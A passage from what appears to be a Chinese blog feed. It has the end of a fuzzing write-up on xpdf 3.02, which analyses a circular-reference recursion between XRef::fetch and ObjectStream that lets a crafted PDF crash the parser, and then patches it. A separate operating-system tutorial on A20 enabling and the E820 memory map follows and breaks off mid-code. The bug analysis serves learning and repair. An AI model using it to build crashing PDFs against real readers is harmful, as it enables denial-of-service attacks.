</ul></li>
<li><strong><code>/Contents 5 0 R</code></strong>：
<ul>
<li>指向
<strong>页面内容流</strong>（<code>5 0 obj</code>），用于绘制文本或图形。</li>
</ul></li>
</ul>
<p><strong>2.4 字体对象 (<code>Font</code>)</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /Font</span><br><span class="line">  /Subtype /Type1</span><br><span class="line">  /BaseFont /Times-Roman</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>对象 ID：</strong> <code>4 0 obj</code></li>
<li><strong><code>/Type /Font</code></strong>：表明该对象是
<strong>字体对象</strong>。</li>
<li><strong><code>/Subtype /Type1</code></strong>：PDF 1.0 时代的
<strong>Type1 字体</strong>，用于打印设备。</li>
<li><strong><code>/BaseFont /Times-Roman</code></strong>：
<ul>
<li>指定 <strong>Times-Roman 字体</strong>（标准 14 种字体之一）。</li>
<li>由于 <strong>标准字体内置在 PDF 查看器中</strong>，所以 PDF
不需要嵌入该字体。</li>
</ul></li>
</ul>
<p><strong>2.5 页面内容 (<code>Contents</code>)</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 0 obj  % page content</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Length 44</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">70 50 TD</span><br><span class="line">/F1 12 Tf</span><br><span class="line">(Hello, world!) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>对象 ID：</strong> <code>5 0 obj</code></li>
<li><strong><code>/Length 44</code></strong>：
<ul>
<li><strong>流的长度为 44
字节</strong>（实际计算时可能不包括换行符）。</li>
</ul></li>
<li><strong><code>stream ... endstream</code></strong>：
<ul>
<li><strong>包含绘制指令</strong>，PDF 使用 PostScript 类似的
<strong>页面描述语言</strong>。</li>
</ul></li>
<li><strong>解释 <code>stream</code> 指令</strong>：
<ul>
<li><code>BT</code>：开始文本模式 (<strong>Begin Text</strong>)。</li>
<li><code>70 50 TD</code>：
<ul>
<li><strong>移动文本位置</strong>（<code>70</code>，<code>50</code>）。</li>
<li><code>TD</code>（Text Move）：移动到 <code>(70, 50)</code>
位置（相对于左下角）。</li>
</ul></li>
<li><code>/F1 12 Tf</code>：
<ul>
<li><strong>设置字体</strong> <code>F1</code>（即 <code>4 0 obj</code>
的 <code>Times-Roman</code>）。</li>
<li><strong>字体大小</strong> <code>12</code> pt。</li>
</ul></li>
<li><code>(Hello, world!) Tj</code>：
<ul>
<li><strong>绘制字符串 <code>Hello, world!</code></strong>。</li>
</ul></li>
<li><code>ET</code>：结束文本模式 (<strong>End Text</strong>)。</li>
</ul></li>
</ul>
<p><strong>3. 交叉引用表（xref）</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">xref</span><br><span class="line">0 6</span><br><span class="line">0000000000 65535 f </span><br><span class="line">0000000010 00000 n </span><br><span class="line">0000000079 00000 n </span><br><span class="line">0000000173 00000 n </span><br><span class="line">0000000301 00000 n </span><br><span class="line">0000000380 00000 n </span><br></pre></td></tr></table></figure></div>
<ul>
<li><p><strong><code>xref</code>
表示交叉引用表的开始</strong>。</p></li>
<li><p><strong><code>0 6</code></strong>：</p>
<ul>
<li>表示 <code>xref</code> 表含有 <strong>6 个对象</strong>（编号
<code>0</code> 到 <code>5</code>）。</li>
</ul></li>
<li><p><strong>每行解释</strong>：</p>
<div class="highlight-container" data-rel="Matlab"><figure class="iseeu highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f   <span class="comment">% 0 号对象（特殊空闲对象）</span></span><br><span class="line"><span class="number">0000000010</span> <span class="number">00000</span> n   <span class="comment">% 1 号对象在文件的第 10 字节</span></span><br><span class="line"><span class="number">0000000079</span> <span class="number">00000</span> n   <span class="comment">% 2 号对象在文件的第 79 字节</span></span><br><span class="line"><span class="number">0000000173</span> <span class="number">00000</span> n   <span class="comment">% 3 号对象在文件的第 173 字节</span></span><br><span class="line"><span class="number">0000000301</span> <span class="number">00000</span> n   <span class="comment">% 4 号对象在文件的第 301 字节</span></span><br><span class="line"><span class="number">0000000380</span> <span class="number">00000</span> n   <span class="comment">% 5 号对象在文件的第 380 字节</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>n</code> 表示 <strong>该对象已使用</strong>。</li>
<li><code>f</code> 表示
<strong>该对象已被删除或未使用</strong>（<code>0</code> 号对象）。</li>
</ul></li>
</ul>
<p><strong>4. Trailer（尾部信息）</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Size 6</span><br><span class="line">  /Root 1 0 R</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>/Size 6</code></strong>：
<ul>
<li>PDF 文件一共 <strong>包含 6 个对象</strong>（编号 <code>0</code> 到
<code>5</code>）。</li>
</ul></li>
<li><strong><code>/Root 1 0 R</code></strong>：
<ul>
<li>PDF <strong>根目录对象</strong>是 <code>1 0 obj</code>（即
<code>Catalog</code>）。</li>
</ul></li>
</ul>
<p><strong>5. 文件结尾</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">startxref</span><br><span class="line">492</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>startxref 492</code></strong>：
<ul>
<li>交叉引用表 (<code>xref</code>) 在 <strong>文件偏移量 492</strong>
处。</li>
</ul></li>
<li><strong><code>%%EOF</code></strong>：
<ul>
<li>PDF 文件的结束标志。</li>
</ul></li>
</ul>
<h6 id="代码分析">代码分析</h6>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// XRef::fetch</span></span><br><span class="line"><span class="keyword">if</span> (!objStr || objStr-&gt;<span class="built_in">getObjStrNum</span>() != (<span class="type">int</span>)e-&gt;offset) &#123;</span><br><span class="line">  <span class="keyword">if</span> (objStr) &#123;</span><br><span class="line">    <span class="keyword">delete</span> objStr;</span><br><span class="line">  &#125;</span><br><span class="line">  objStr = <span class="keyword">new</span> <span class="built_in">ObjectStream</span>(<span class="keyword">this</span>, e-&gt;offset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>当 <code>xref</code> 表项是 <strong>压缩对象流
(xrefEntryCompressed)</strong> 时，它会：</p>
<ol type="1">
<li><strong>创建一个新的 ObjectStream</strong></li>
<li><strong>调用 ObjectStream::getObject</strong> 来获取具体的对象</li>
</ol>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ObjectStream::ObjectStream</span></span><br><span class="line"><span class="keyword">if</span> (!xref-&gt;<span class="built_in">fetch</span>(objStrNum, <span class="number">0</span>, &amp;objStr)-&gt;<span class="built_in">isStream</span>()) &#123;</span><br><span class="line">  <span class="keyword">goto</span> err1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>当 <strong>ObjectStream::ObjectStream</strong> 试图加载
<code>objStrNum</code> 时，它会调用 <strong>xref-&gt;fetch</strong>
来获取对应的对象，而这个 <code>fetch</code> 可能会继续触发
<strong>ObjectStream::ObjectStream</strong>，导致无限递归。</p>
<p><strong>漏洞根因</strong></p>
<ul>
<li>当 PDF 文件中的交叉引用表 (xref) 让某个对象指向
<strong>另一个压缩对象流</strong>，但该压缩对象流本身也存储在另一个压缩对象流内，这样
<code>fetch</code> 和 <code>ObjectStream</code> 之间会无限调用，最终导致
<strong>栈溢出 (stack overflow)</strong>。</li>
<li>这个错误通常发生在 <strong>循环引用 (circular reference)</strong> 或
<strong>递归解压 (recursive decompression)</strong> 时。</li>
</ul>
<h5 id="漏洞修复">漏洞修复</h5>
<p>需要修复的源码位于<strong>xpdf/XRef.cc</strong>中。我们可以用
<strong>哈希表 (std::unordered_set)</strong>
记录访问过的对象，避免重复解析。为了保留原始版本这里我们再解压一边<strong>xpdf-3.02</strong>，并将其命名为<strong>fixed-xpdf-3.02</strong>。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::unordered_set&lt;<span class="type">int</span>&gt; visitedObjects; <span class="comment">// 记录访问过的对象</span></span><br><span class="line"></span><br><span class="line"><span class="function">Object *<span class="title">XRef::fetch</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> gen, Object *obj)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (visitedObjects.<span class="built_in">count</span>(num) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">error</span>(<span class="string">&quot;XRef::fetch: Circular reference detected!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;<span class="built_in">initNull</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  visitedObjects.<span class="built_in">insert</span>(num); <span class="comment">// 标记当前对象已访问</span></span><br><span class="line"></span><br><span class="line">  XRefEntry *e;</span><br><span class="line">  Parser *parser;</span><br><span class="line">  Object obj1, obj2, obj3;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (num &lt; <span class="number">0</span> || num &gt;= size) &#123;</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  e = &amp;entries[num];</span><br><span class="line">  <span class="keyword">switch</span> (e-&gt;type) &#123;</span><br><span class="line">    <span class="keyword">case</span> xrefEntryUncompressed:</span><br><span class="line">      <span class="keyword">if</span> (e-&gt;gen != gen) &#123;</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">      obj<span class="number">1.</span><span class="built_in">initNull</span>();</span><br><span class="line">      parser = <span class="keyword">new</span> <span class="built_in">Parser</span>(<span class="keyword">this</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Lexer</span>(<span class="keyword">this</span>,</span><br><span class="line">          str-&gt;<span class="built_in">makeSubStream</span>(start + e-&gt;offset, gFalse, <span class="number">0</span>, &amp;obj1)),</span><br><span class="line">        gTrue);</span><br><span class="line">      parser-&gt;<span class="built_in">getObj</span>(&amp;obj1);</span><br><span class="line">      parser-&gt;<span class="built_in">getObj</span>(&amp;obj2);</span><br><span class="line">      parser-&gt;<span class="built_in">getObj</span>(&amp;obj3);</span><br><span class="line">      <span class="keyword">if</span> (!obj<span class="number">1.</span><span class="built_in">isInt</span>() || obj<span class="number">1.</span><span class="built_in">getInt</span>() != num ||</span><br><span class="line">        !obj<span class="number">2.</span><span class="built_in">isInt</span>() || obj<span class="number">2.</span><span class="built_in">getInt</span>() != gen ||</span><br><span class="line">        !obj<span class="number">3.</span><span class="built_in">isCmd</span>(<span class="string">&quot;obj&quot;</span>)) &#123;</span><br><span class="line">        obj<span class="number">1.f</span>ree();</span><br><span class="line">        obj<span class="number">2.f</span>ree();</span><br><span class="line">        obj<span class="number">3.f</span>ree();</span><br><span class="line">        <span class="keyword">delete</span> parser;</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">      parser-&gt;<span class="built_in">getObj</span>(obj, encrypted ? fileKey : (Guchar *)<span class="literal">NULL</span>,</span><br><span class="line">        encAlgorithm, keyLength, num, gen);</span><br><span class="line">      obj<span class="number">1.f</span>ree();</span><br><span class="line">      obj<span class="number">2.f</span>ree();</span><br><span class="line">      obj<span class="number">3.f</span>ree();</span><br><span class="line">      <span class="keyword">delete</span> parser;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> xrefEntryCompressed:</span><br><span class="line">      <span class="keyword">if</span> (gen != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!objStr || objStr-&gt;<span class="built_in">getObjStrNum</span>() != (<span class="type">int</span>)e-&gt;offset) &#123;</span><br><span class="line">        <span class="keyword">if</span> (objStr) &#123;</span><br><span class="line">          <span class="keyword">delete</span> objStr;</span><br><span class="line">        &#125;</span><br><span class="line">        objStr = <span class="keyword">new</span> <span class="built_in">ObjectStream</span>(<span class="keyword">this</span>, e-&gt;offset);</span><br><span class="line">      &#125;</span><br><span class="line">      objStr-&gt;<span class="built_in">getObject</span>(e-&gt;gen, num, obj);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  visitedObjects.<span class="built_in">erase</span>(num); <span class="comment">// 解析完后移除标记</span></span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">  visitedObjects.<span class="built_in">erase</span>(num);</span><br><span class="line">  <span class="keyword">return</span> obj-&gt;<span class="built_in">initNull</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后再次编译，把二进制文件输出到<strong>fixed/bin</strong>目录下。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> fixed-xpdf-3.02</span><br><span class="line">CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=<span class="string">&quot;path/to/fuzzing_xpdf/fixed&quot;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>之后用修复好编译后的<strong>pdftotext</strong>用之前触发crash的样本进行测试，此时就会输出<strong>Circular
reference detected!</strong>而不是直接<strong>seg
fault</strong>，这里的2就是前面fuzz出的id为2的样本，只是改了个名，然后也用github仓库中对应给的<strong>solution</strong>进行了验证，也是成功的进行了修复。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/image-20250401134648864.png"
                      class=""
                >
]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
        <tag>gdb</tag>
        <tag>pdf</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始搭建自制操作系统——物理内存管理器&amp;简单分页机制实现</title>
    <url>/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8-%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>这里开始我了解到其实可以选择用<strong>GRUB</strong>作为bootloader来加载入自制的内核，不过既然我打算从零开始实现一个学习用的操作系统，这里就用自己写的bootloader。实际上我一开始实现的<strong>bootloader</strong>还有些小问题可以优化。</p>
<h3 id="bootloader优化">bootloader优化</h3>
<h4 id="启用a20总线">启用A20总线</h4>
<p>之前我们实现的bootloader并没有手动启用A20总线，这里对
https://wiki.osdev.org/A20_Line
这里给出的启动A20总线的汇编代码给出解释。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;	out:</span><br><span class="line">;		ax - state (0 - disabled, 1 - enabled)</span><br><span class="line">get_a20_state:</span><br><span class="line">	pushf</span><br><span class="line">	push si</span><br><span class="line">	push di</span><br><span class="line">	push ds</span><br><span class="line">	push es</span><br><span class="line">	cli</span><br><span class="line"></span><br><span class="line">	mov ax, 0x0000					;	0x0000:0x0500(0x00000500) -&gt; ds:si</span><br><span class="line">	mov ds, ax</span><br><span class="line">	mov si, 0x0500</span><br><span class="line"></span><br><span class="line">	not ax							;	0xffff:0x0510(0x00100500) -&gt; es:di</span><br><span class="line">	mov es, ax</span><br><span class="line">	mov di, 0x0510</span><br><span class="line"></span><br><span class="line">	mov al, [ds:si]					;	save old values</span><br><span class="line">	mov byte [.BufferBelowMB], al</span><br><span class="line">	mov al, [es:di]</span><br><span class="line">	mov byte [.BufferOverMB], al</span><br><span class="line"></span><br><span class="line">	mov ah, 1						;	check byte [0x00100500] == byte [0x0500]</span><br><span class="line">	mov byte [ds:si], 0</span><br><span class="line">	mov byte [es:di], 1</span><br><span class="line">	mov al, [ds:si]</span><br><span class="line">	cmp al, [es:di]</span><br><span class="line">	jne .exit</span><br><span class="line">	dec ah</span><br><span class="line">.exit:</span><br><span class="line">	mov al, [.BufferBelowMB]</span><br><span class="line">	mov [ds:si], al</span><br><span class="line">	mov al, [.BufferOverMB]</span><br><span class="line">	mov [es:di], al</span><br><span class="line">	shr ax, 8</span><br><span class="line">	sti</span><br><span class="line">	pop es</span><br><span class="line">	pop ds</span><br><span class="line">	pop di</span><br><span class="line">	pop si</span><br><span class="line">	popf</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">	.BufferBelowMB:	db 0</span><br><span class="line">	.BufferOverMB	db 0</span><br><span class="line"></span><br><span class="line">;	out:</span><br><span class="line">;		ax - a20 support bits (bit #0 - supported on keyboard controller; bit #1 - supported with bit #1 of port 0x92)</span><br><span class="line">;		cf - set on error</span><br><span class="line">query_a20_support:</span><br><span class="line">	push bx</span><br><span class="line">	clc</span><br><span class="line"></span><br><span class="line">	mov ax, 0x2403</span><br><span class="line">	int 0x15</span><br><span class="line">	jc .error</span><br><span class="line"></span><br><span class="line">	test ah, ah</span><br><span class="line">	jnz .error</span><br><span class="line"></span><br><span class="line">	mov ax, bx</span><br><span class="line">	pop bx</span><br><span class="line">	ret</span><br><span class="line">.error:</span><br><span class="line">	stc</span><br><span class="line">	pop bx</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">enable_a20_keyboard_controller:</span><br><span class="line">	cli</span><br><span class="line"></span><br><span class="line">	call .wait_io1</span><br><span class="line">	mov al, 0xad</span><br><span class="line">	out 0x64, al</span><br><span class="line">	</span><br><span class="line">	call .wait_io1</span><br><span class="line">	mov al, 0xd0</span><br><span class="line">	out 0x64, al</span><br><span class="line">	</span><br><span class="line">	call .wait_io2</span><br><span class="line">	in al, 0x60</span><br><span class="line">	push eax</span><br><span class="line">	</span><br><span class="line">	call .wait_io1</span><br><span class="line">	mov al, 0xd1</span><br><span class="line">	out 0x64, al</span><br><span class="line">	</span><br><span class="line">	call .wait_io1</span><br><span class="line">	pop eax</span><br><span class="line">	or al, 2</span><br><span class="line">	out 0x60, al</span><br><span class="line">	</span><br><span class="line">	call .wait_io1</span><br><span class="line">	mov al, 0xae</span><br><span class="line">	out 0x64, al</span><br><span class="line">	</span><br><span class="line">	call .wait_io1</span><br><span class="line">	sti</span><br><span class="line">	ret</span><br><span class="line">.wait_io1:</span><br><span class="line">	in al, 0x64</span><br><span class="line">	test al, 2</span><br><span class="line">	jnz .wait_io1</span><br><span class="line">	ret</span><br><span class="line">.wait_io2:</span><br><span class="line">	in al, 0x64</span><br><span class="line">	test al, 1</span><br><span class="line">	jz .wait_io2</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">;	out:</span><br><span class="line">;		cf - set on error</span><br><span class="line">enable_a20:</span><br><span class="line">	clc									;	clear cf</span><br><span class="line">	pusha</span><br><span class="line">	mov bh, 0							;	clear bh</span><br><span class="line"></span><br><span class="line">	call get_a20_state</span><br><span class="line">	jc .fast_gate</span><br><span class="line"></span><br><span class="line">	test ax, ax</span><br><span class="line">	jnz .done</span><br><span class="line"></span><br><span class="line">	call query_a20_support</span><br><span class="line">	mov bl, al</span><br><span class="line">	test bl, 1							;	enable A20 using keyboard controller</span><br><span class="line">	jnz .keybord_controller</span><br><span class="line"></span><br><span class="line">	test bl, 2							;	enable A20 using fast A20 gate</span><br><span class="line">	jnz .fast_gate</span><br><span class="line">.bios_int:</span><br><span class="line">	mov ax, 0x2401</span><br><span class="line">	int 0x15</span><br><span class="line">	jc .fast_gate</span><br><span class="line">	test ah, ah</span><br><span class="line">	jnz .failed</span><br><span class="line">	call get_a20_state</span><br><span class="line">	test ax, ax</span><br><span class="line">	jnz .done</span><br><span class="line">.fast_gate:</span><br><span class="line">	in al, 0x92</span><br><span class="line">	test al, 2</span><br><span class="line">	jnz .done</span><br><span class="line"></span><br><span class="line">	or al, 2</span><br><span class="line">	and al, 0xfe</span><br><span class="line">	out 0x92, al</span><br><span class="line"></span><br><span class="line">	call get_a20_state</span><br><span class="line">	test ax, ax</span><br><span class="line">	jnz .done</span><br><span class="line"></span><br><span class="line">	test bh, bh							;	test if there was an attempt using the keyboard controller</span><br><span class="line">	jnz .failed</span><br><span class="line">.keybord_controller:</span><br><span class="line">	call enable_a20_keyboard_controller</span><br><span class="line">	call get_a20_state</span><br><span class="line">	test ax, ax</span><br><span class="line">	jnz .done</span><br><span class="line"></span><br><span class="line">	mov bh, 1							;	flag enable attempt with keyboard controller</span><br><span class="line"></span><br><span class="line">	test bl, 2</span><br><span class="line">	jnz .fast_gate</span><br><span class="line">	jmp .failed</span><br><span class="line">.failed:</span><br><span class="line">	stc</span><br><span class="line">.done:</span><br><span class="line">	popa</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure></div>
<p>这段代码模块划分清晰，大致包含：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enable_a20</span><br><span class="line">├── get_a20_state          ; 检查当前是否启用了 A20（比较内存内容）</span><br><span class="line">├── query_a20_support      ; 使用 BIOS 查询系统支持哪些 A20 启用方式</span><br><span class="line">├── enable_a20_keyboard_controller  ; 使用键盘控制器开启 A20</span><br><span class="line">├── fallback: port 0x92 Fast A20 Gate 或 BIOS int 0x15</span><br></pre></td></tr></table></figure></div>
<p><code>get_a20_state</code> – 检查 A20 是否已经启用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ds, 0x0000</span><br><span class="line">mov si, 0x0500</span><br><span class="line">mov es, 0xFFFF</span><br><span class="line">mov di, 0x0510</span><br></pre></td></tr></table></figure></div>
<p>对比 <code>0x00000500</code> 和 <code>0x00100510</code>
两个地址是否是 <strong>两个不同位置</strong>：</p>
<ul>
<li>如果 A20 <strong>未启用</strong>，访问 <code>0x00100510</code> 会
wrap 到 <code>0x00000510</code>，写入值一样</li>
<li>如果 A20 <strong>启用</strong>，则能看到两个地址独立</li>
</ul>
<p>通过这两个地址互写不同的值，然后判断它们是否相等来判断 A20 状态。</p>
<p><code>query_a20_support</code> – 用 <code>int 0x15, ax=0x2403</code>
检查系统支持的 A20 开启方式</p>
<p>BIOS 返回 <code>BX</code> 的位表示支持方式：</p>
<table>
<thead>
<tr>
<th>Bit</th>
<th>方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>键盘控制器（KBC）</td>
</tr>
<tr>
<td>1</td>
<td>快速 A20 端口（0x92）</td>
</tr>
</tbody>
</table>
<p>这部分是用于判断优先使用哪种方法开启 A20。</p>
<p><code>enable_a20_keyboard_controller</code> – 用键盘控制器方式开启
A20</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">out 0x64, 0xAD    ; 禁用键盘</span><br><span class="line">out 0x64, 0xD0    ; 命令: 读输出端口</span><br><span class="line">in  al, 0x60      ; 读取当前值</span><br><span class="line">or  al, 2         ; 设置 A20（bit1）</span><br><span class="line">out 0x64, 0xD1    ; 命令: 写输出端口</span><br><span class="line">out 0x60, al      ; 写入修改值</span><br><span class="line">out 0x64, 0xAE    ; 重新启用键盘</span><br></pre></td></tr></table></figure></div>
<p>这种方式比较传统但慢，兼容性较好。</p>
<p><code>.fast_gate</code> – 使用端口 <code>0x92</code> 快速开启
A20（现代推荐）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">in al, 0x92</span><br><span class="line">or al, 2      ; 设置 A20 enable（bit1）</span><br><span class="line">and al, 0xFE  ; 清除重启位（bit0）</span><br><span class="line">out 0x92, al</span><br></pre></td></tr></table></figure></div>
<p>这种方式不经过键盘控制器，简单、快速，现代系统普遍支持。</p>
<p><code>enable_a20</code> – 主函数流程逻辑总结</p>
<ol type="1">
<li><strong>尝试检测是否已经开启 A20</strong>，如果是，直接返回。</li>
<li><strong>查询系统支持的开启方式</strong>。</li>
<li>优先尝试：
<ul>
<li>BIOS <code>int 15h</code>（启用 A20）</li>
<li>快速端口（0x92）</li>
<li>键盘控制器（慢）</li>
</ul></li>
<li>每次尝试后重新调用 <code>get_a20_state</code>
检查是否启用成功。</li>
<li>若都失败，返回 CF=1 代表失败。</li>
</ol>
<p>但实际上当我进行调试时发现，在一开始get_a20_state时，两者就已经相等，直接跳转到.done了，这是因为<strong>QEMU、VirtualBox、VMware
等虚拟机</strong>几乎都会提前启用 A20。</p>
<h4 id="获取可用内存">获取可用内存</h4>
<p><code>INT 15h, AX=E820h</code>是 BIOS
提供的一个服务，用于返回系统物理内存的分布情况（即内存映射表），告诉你哪些内存是可用的、保留的、ACPI
的、设备的等等。这对后续实现物理内存分配器具有重要作用。</p>
<p>调用方式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, 0xe820        ; 功能号</span><br><span class="line">mov edx, 0x534D4150   ; &quot;SMAP&quot; 魔数，必须设定，否则调用失败</span><br><span class="line">mov ecx, 20           ; 请求的数据结构大小（bytes）</span><br><span class="line">mov ebx, 0            ; 第一次调用时 EBX = 0，之后 BIOS 会填充下一个索引</span><br><span class="line">mov es:di, buffer     ; 内存缓冲区，用于接受返回的结构体</span><br><span class="line"></span><br><span class="line">int 0x15</span><br></pre></td></tr></table></figure></div>
<p>返回值</p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>CF</td>
<td>清除，表示成功（即 CF=0）</td>
</tr>
<tr>
<td>EAX</td>
<td>返回 <code>0x534D4150</code>（"SMAP"），确认有效响应</td>
</tr>
<tr>
<td>ECX</td>
<td>返回实际写入的字节数（一般为 20）</td>
</tr>
<tr>
<td>EBX</td>
<td>下一个结构的索引（递归查询用，传入 0 获取第一个）</td>
</tr>
<tr>
<td>ES:DI</td>
<td>缓冲区里存放了以下结构体：</td>
</tr>
</tbody>
</table>
<p>结构体格式（20字节，每次读取）</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> base_addr;     <span class="comment">// 基地址 (低地址 + 高地址)</span></span><br><span class="line">    <span class="type">uint64_t</span> length;        <span class="comment">// 长度（bytes）</span></span><br><span class="line">    <span class="type">uint32_t</span> type;          <span class="comment">// 类型（1 表示可用）</span></span><br><span class="line">&#125; __attribute__((packed)) E820Entry;</span><br></pre></td></tr></table></figure></div>
<table>
<thead>
<tr>
<th>Type 值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>可用内存（可用于加载内核）</td>
</tr>
<tr>
<td>2</td>
<td>保留区（系统/设备使用）</td>
</tr>
<tr>
<td>3</td>
<td>ACPI 可恢复内存</td>
</tr>
<tr>
<td>4</td>
<td>ACPI NVS</td>
</tr>
<tr>
<td>5+</td>
<td>保留</td>
</tr>
</tbody>
</table>
<p>我们可以用如下方式进行循环读取到0x5000地址处，每个结构体大小为20字节，其中我们把读取的个数存在0x4FFE地址处。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_memory_map:</span><br><span class="line">	push es</span><br><span class="line">; 设置 ES:DI = 0x5000</span><br><span class="line">    mov ax, 0x500</span><br><span class="line">    mov es, ax</span><br><span class="line">    xor di, di               ; ES:DI = 0x5000</span><br><span class="line"></span><br><span class="line">    xor ebx, ebx             ; 初始化 continuation value 为 0</span><br><span class="line">    mov word [0x4FFE], 0	 ; 保存 entry 总数</span><br><span class="line"></span><br><span class="line">.get_next_entry:</span><br><span class="line">    mov eax, 0xE820</span><br><span class="line">    mov edx, 0x534D4150      ; &#x27;SMAP&#x27;</span><br><span class="line">    mov ecx, 20              ; 请求返回结构大小为 20 字节（不含 ACPI）</span><br><span class="line">    mov dword [es:di + 20], 1 ; 保证 type 有默认值</span><br><span class="line">    int 0x15</span><br><span class="line">    jc .done                 ; 如果调用失败，跳出</span><br><span class="line"></span><br><span class="line">    cmp eax, 0x534D4150</span><br><span class="line">    jne .done                ; 如果返回的签名不正确，退出</span><br><span class="line"></span><br><span class="line">    add di, 20               ; 下一个结构体写入位置（每个是 20 字节）</span><br><span class="line">	inc word [0x4FFE]	 	 ; 增加 entry 统计数量</span><br><span class="line"></span><br><span class="line">    test ebx, 